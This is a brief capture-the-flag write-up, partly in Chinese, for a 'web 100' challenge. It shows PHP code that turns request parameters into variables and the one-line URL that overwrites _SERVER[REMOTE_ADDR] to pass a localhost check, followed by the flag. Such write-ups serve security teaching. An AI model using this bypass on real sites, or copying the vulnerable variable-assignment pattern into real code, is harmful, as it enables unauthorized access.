# Overthewire (web 100)
##### team: sblan
##### participant: 廖唯辰 (r04922161)
## Description
```
http://overthewire.hackme.cc/
```
## Solution
overthewire.txt  
```
foreach ($_REQUEST as $key => $value) {
        $$key = $value;
}

if ( $_SERVER['REMOTE_ADDR'] == '127.0.0.1' ){
    echo $flag;
} else {
    echo 'there is no space like 127.0.0.1';
}
```
顯然的變量覆蓋漏洞  
```
http://overthewire.hackme.cc/overthewire.php?_SERVER[REMOTE_ADDR]=127.0.0.1
```
得到 flag `CTF{the_world_is_not_beautiful_therefore_it_is}`  
